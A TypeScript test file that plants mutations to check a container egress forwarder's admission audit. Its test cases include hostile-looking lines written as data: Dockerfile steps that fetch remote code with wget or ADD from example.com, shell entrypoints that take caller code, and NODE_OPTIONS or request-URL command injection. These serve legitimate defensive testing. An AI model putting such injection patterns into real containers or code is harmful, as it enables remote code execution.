// Planted reds for gate:egress-interception's forwarder admission: the live CodexEgress passes, and each mutation of
// one proof keeps a container in the interception set.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { CONTAINER_IMAGES, imageReference, readSource, sourceHash } from './container-images';
import { auditForwarder, loadForwarderSurface, surfaceOf, surfaceReasons, type ForwarderInputs, type ForwarderSurface } from './egress-interception';

const REPO = join(import.meta.dir, '..');

const FILE = 'packages/cf-backend/src/egress/codex-egress.ts';

const IMAGE = CONTAINER_IMAGES.CodexEgress;

const DOCKERFILE = `${IMAGE.source}/Dockerfile`;

const SURFACE: ForwarderSurface = await loadForwarderSurface(join(REPO, FILE), 'CodexEgress') ?? { parentIsDurableObject: false, methods: [] };

function live(): ForwarderInputs {
  return {
    owner: 'CodexEgress',
    file: FILE,
    fileText: readFileSync(join(REPO, FILE), 'utf8'),
    image: IMAGE,
    boundImage: imageReference(IMAGE),
    sourceFiles: readSource(REPO, IMAGE.source),
    surface: SURFACE,
  };
}

/** The live inputs with one source file rewritten and its hash recorded, so only the proof under test fails. */
function withFile(path: string, rewrite: (text: string) => string): ForwarderInputs {
  const files = new Map(live().sourceFiles);
  files.set(path, rewrite(String(files.get(path) ?? '')));

  return { ...live(), sourceFiles: files, image: { ...IMAGE, sourceHash: sourceHash(files) } };
}

describe('a direct Container is admitted only with all three proofs', () => {
  test('the live CodexEgress is admitted', () => {
    expect(auditForwarder(live())).toEqual([]);
  });

  test('(a) no record, a moved source, or a different bound image keeps it in the set', () => {
    expect(auditForwarder({ ...live(), image: undefined })).toHaveLength(1);

    const moved = new Map(live().sourceFiles);
    moved.set(`${IMAGE.source}/server.mjs`, `${String(moved.get(`${IMAGE.source}/server.mjs`))}\n// edited after the push\n`);
    expect(auditForwarder({ ...live(), sourceFiles: moved }).join('\n')).toContain('no longer hashes');

    expect(auditForwarder({ ...live(), boundImage: `${IMAGE.repository}@sha256:${'0'.repeat(64)}` }).join('\n')).toContain('is bound to');
  });

  test('(b) anything but FROM, COPY, WORKDIR, ENV, EXPOSE, USER, LABEL and CMD, or a foreign program, keeps it in the set', () => {
    const cases: ReadonlyArray<readonly [string, (text: string) => string]> = [
      ['uses `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
      ['uses `ENTRYPOINT`', (text) => text.replace(/^CMD /mu, 'ENTRYPOINT ["sh", "-c", "$CODE"]\nCMD ')],
      ['uses `ONBUILD`', (text) => text.replace('USER node', 'ONBUILD RUN wget https://example.com/agent.js\nUSER node')],
      ['uses `ADD`', (text) => text.replace('COPY server.mjs policy.mjs .', 'ADD https://example.com/agent.js .\nCOPY server.mjs policy.mjs .')],
      ['uses `RUN`', (text) => text.replace('COPY server.mjs policy.mjs .', 'COPY server.mjs policy.mjs \\\n  .\nLABEL a=b \\\nRUN=1\nRUN \\\n  wget https://example.com/x')],
      ['not a tracked file', (text) => text.replace('COPY server.mjs policy.mjs .', 'COPY server.mjs \\\n  agent.js .')],
      ['not a pinned digest', (text) => text.replace(/^FROM .*$/mu, 'FROM node:22-alpine')],
      ['not one tracked script', (text) => text.replace(/^CMD .*$/mu, 'CMD ["node", "-e", "require(process.env.CODE)"]')],
      ['sets a NODE_ variable', (text) => text.replace('USER node', 'ENV NODE_OPTIONS=--import=data:text/javascript,x\nUSER node')],
      ['names CMD twice', (text) => `${text}CMD ["node", "server.mjs"]\n`],
    ];

    for (const [reason, rewrite] of cases) {
      const rewritten = withFile(DOCKERFILE, rewrite);

      expect({ reason, changed: rewritten.sourceFiles.get(DOCKERFILE) !== live().sourceFiles.get(DOCKERFILE) }).toEqual({ reason, changed: true });
      expect({ reason, found: auditForwarder(rewritten).join('\n').includes(reason) }).toEqual({ reason, found: true });
    }
  });

  test('(c) the loaded class exposes exactly the classified surface, and a base class on it is red', () => {
    expect({ parent: SURFACE.parentIsDurableObject, methods: [...SURFACE.methods].sort() })
      .toEqual({ parent: true, methods: ['cancel', 'constructor', 'forward'] });

    class DurableObject {}

    class Base extends DurableObject {
      doStartContainer(): string { return 'base'; }
    }

    class Inheriting extends Base {}

    class Extra extends DurableObject {
      persistOutboundConfiguration(): string { return 'extra'; }
    }

    class Accessor extends DurableObject {
      get boot(): () => string { return () => 'box'; }
    }

    expect(surfaceReasons(surfaceOf(Inheriting, DurableObject)).join('\n')).toContain('does not extend DurableObject directly');
    expect(surfaceReasons(surfaceOf(Extra, DurableObject)).join('\n')).toContain('exposes `persistOutboundConfiguration`');
    expect(surfaceReasons(surfaceOf(Accessor, DurableObject)).join('\n')).toContain('exposes `boot`');
  });

  test('(c) native container capabilities cannot escape or accept caller-selected programs', () => {
    const text = live().fileText;

    const cases: ReadonlyArray<readonly [string, string]> = [
      ['start command override', text.replace('container.start({ enableInternet: true })', "container.start({ enableInternet: true, entrypoint: ['sh'] })")],
      ['startup environment', text.replace('container.start({ enableInternet: true })', "container.start({ enableInternet: true, env: { NODE_OPTIONS: request.url } })")],
      ['caller-selected command', text.replace("['node', '-e', PORT_READY]", "['node', '-e', request.url]")],
      ['caller-selected readiness arguments', text.replace("['node', '-e', PORT_READY]", "['node', '-e', PORT_READY, request.url]")],
      ['exec environment', text.replace('{ signal })).output()', '{ signal, env: { NODE_OPTIONS: request.url } })).output()')],
      ['foreign port', text.replace('container.getTcpPort(8080)', 'container.getTcpPort(22)')],
      ['returned native capability', text.replace('    const container = this.ctx.container;', '    const container = this.ctx.container; return container;')],
      ['returned alias', text.replace('    const container = this.ctx.container;', '    const container = this.ctx.container; const alias = container; return alias;')],
      ['computed capability access', text.replace('container.getTcpPort(8080)', "container['getTcpPort'](8080)")],
      ['caller-selected forward address', text.replace("new Request('http://codex-egress/forward',", 'new Request(request.url,')],
      ['decorator', text.replace('export class CodexEgress', '@withRun\nexport class CodexEgress')],
      ['getter capability', text.replace('  cancel(callId: string): void {', '  get container() { return this.ctx.container; }\n  cancel(callId: string): void {')],
      ['setter capability', text.replace('  cancel(callId: string): void {', '  set container(value: Container) { void value; }\n  cancel(callId: string): void {')],
      ['escaping closure', text.replace('    this.#calls.cancel(callId);', '    const later = () => this.ctx.container; return later;')],
      ['unowned call lifetime', text.replace('  readonly #calls = new EgressCalls();', '  readonly #calls = { run: async (_id: string, work: object) => { void work; return new Response(); }, cancel() {} };')],
      ['shadowed call owner', text.replace("import { codexEgressAllowed, EgressCalls } from '@kinu.run/core';", "import { codexEgressAllowed } from '@kinu.run/core';\nclass EgressCalls { async run(_id: string, work: object) { void work; return new Response(); } cancel(_id: string) {} }")],
    ];

    for (const [risk, source] of cases) {
      expect({ risk, changed: source !== text }).toEqual({ risk, changed: true });
      expect({ risk, admitted: auditForwarder({ ...live(), fileText: source }).length === 0 }).toEqual({ risk, admitted: false });
    }
  });

});
